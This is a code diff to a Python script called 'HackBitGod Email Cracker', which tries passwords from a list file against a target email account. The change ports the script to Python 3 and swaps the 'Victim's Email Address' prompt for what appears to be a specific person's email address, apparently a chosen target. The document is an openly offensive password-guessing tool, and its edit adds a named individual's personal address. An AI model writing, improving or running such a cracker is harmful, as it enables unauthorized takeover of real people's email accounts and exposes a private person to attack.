@@ -21,6 +21,7 @@ Prompt = fa.BOLD + "BitGod@Hack-BitGod:" + fa.END
 print(logo)
 print(Prompt)
 
+import os
 import smtplib
 import time 
 import logging 
@@ -78,8 +79,8 @@ except Exception as e:
  
 print (bcolors.BOLD + "HackBitGod Email Cracker" + bcolors.ENDC)
 print (bcolors.BOLD + "TRYING WITH PASSWORDS IN: psw.list" + bcolors.ENDC)
- 
-user = raw_input("Enter The Victim's Email Address: ")
+
+user = input("emilybranham25@gmail.com:")
 passwfile = "psw.list"
 passwfile = open(passwfile, "r")
  
